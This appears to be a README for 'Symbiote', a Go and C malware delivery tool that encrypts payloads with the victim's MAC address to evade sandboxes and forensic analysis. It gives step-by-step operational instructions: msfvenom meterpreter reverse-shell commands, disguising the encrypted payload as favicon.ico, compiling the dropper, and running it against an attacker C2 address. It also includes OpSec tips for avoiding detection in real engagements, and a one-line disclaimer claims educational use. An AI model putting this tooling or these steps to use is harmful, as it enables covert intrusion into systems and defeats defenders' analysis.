#🦠 Symbiote: Environmental Keyed Payload Delivery

![Go](https://img.shields.io/badge/Go-1.21+-00ADD8?style=flat&logo=go)
![C](https://img.shields.io/badge/C-Implant-A8B9CC?style=flat&logo=c)
![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux-lightgrey)
![Category](https://img.shields.io/badge/Category-Red%20Team%20%2F%20Evasion-red)

**Symbiote** is a cross-platform malware delivery system designed to evade sandbox analysis and forensic investigation. It utilizes **Environmental Keying**, meaning the payload is encrypted using the target machine's physical hardware ID (MAC Address). If the payload is executed in a sandbox, a researcher's VM, or any machine other than the intended target, it fails to decrypt and remains harmless garbage data.

---

## 🏗️ Architecture

Symbiote operates on a **"Lock and Key"** model:

1.  **The Lock (Builder):** The payload is XOR-encrypted using the victim's MAC address.
2.  **The Guard (C2 Server):** A Go-based HTTP server hosts the file but only serves it to agents with a specific secret User-Agent.
3.  **The Key (Implant):** A C-based dropper runs on the victim, detects its own MAC address, downloads the payload, decrypts it in memory, and executes it as a background daemon.

```mermaid
graph TD
    A[Attacker] -->|1. Build & Encrypt (Key: Target MAC)| B(Encrypted Payload)
    B -->|2. Host File| C[Go C2 Server]
    D[Victim Machine] -->|3. Request (Secret User-Agent)| C
    C -->|4. Download Encrypted Blob| D
    D -->|5. Detect Local MAC| D
    D -->|6. XOR Decrypt| E{MAC Match?}
    E -->|Yes| F[Execute Payload]
    E -->|No| G[Crash / Garbage Data]
✨ Key Features
🔒 Anti-Forensics / Sandbox Evasion: The payload is cryptographically locked to the specific hardware of the target. It cannot be analyzed offline without the victim's MAC address.

🐧 🪟 Cross-Platform Support: Single codebase supports both Windows (WinHTTP, ShellExecute) and Linux (Sockets, Fork/Setsid).

👻 Daemonization: Implants automatically fork and detach from the terminal (setsid), redirecting IO to /dev/null to prevent "Session Died" errors and ensure persistence after the terminal closes.

💾 Universal Dropper: Capable of dropping and executing any file type (ELF, EXE, Scripts), not just raw shellcode.

🛡️ C2 Traffic Filtering: The delivery server rejects standard web crawlers and Blue Team scanners by enforcing strict User-Agent allow-listing.

🛠️ Prerequisites
Go (Golang): To run the builder and server.

GCC / MinGW: To compile the C implant.

Metasploit / MSFVenom: To generate the initial payloads (optional).

🚀 Usage Guide
1. Reconnaissance
Obtain the MAC address of your target machine.

Linux: ip link or ifconfig

Windows: ipconfig /all

2. Payload Generation
Generate a Stageless payload (recommended for stability).

Linux:

Bash

msfvenom -p linux/x64/meterpreter_reverse_tcp ... -f elf -o malware.elf
Windows:

Bash

msfvenom -p windows/x64/meterpreter_reverse_tcp ... -f exe -o malware.exe
3. Weaponization (Encryption)
Use the Symbiote CLI to lock the payload to the target.

Bash

# Syntax: ./symbiote build --mac <TARGET_MAC> --input <PAYLOAD_FILE>

# Example
go run main.go build --mac 00-15-5D-01-CA-05 --input malware.elf
Output: favicon.ico (Encrypted file)

4. Compile the Implant
Compile the C loader for your target OS.

For Linux Targets:

Bash

gcc implant/implant.c -o implant-linux
For Windows Targets:

Bash

gcc implant/implant.c -o implant.exe -lwinhttp -liphlpapi -lshell32
5. Execution (The Attack)
Terminal 1: Attacker (C2 Server) Start the delivery server.

Bash

go run main.go serve --port 8080
Terminal 2: Victim (Implant) Run the implant, pointing it to the attacker's IP.

Bash

# ./implant <ATTACKER_IP> <PORT>
./implant-linux 192.168.1.50 8080
⚠️ Operational Security (OpSec) Notes
Runtime Arguments: Currently, the C2 IP is passed via command line arguments for testing flexibility. In a real engagement, this would be hardcoded or patched into the binary to avoid process listing detection (ps aux).

Disk Drop: This tool acts as a Dropper (writes to %TEMP% or /tmp). While this ensures compatibility with complex binaries (ELF/EXE), it is less stealthy than pure in-memory injection.

⚖️ Disclaimer
This project is for educational purposes and authorized Red Team engagements only.

The author is not responsible for any misuse of this tool. Do not use this against systems you do not have explicit permission to test.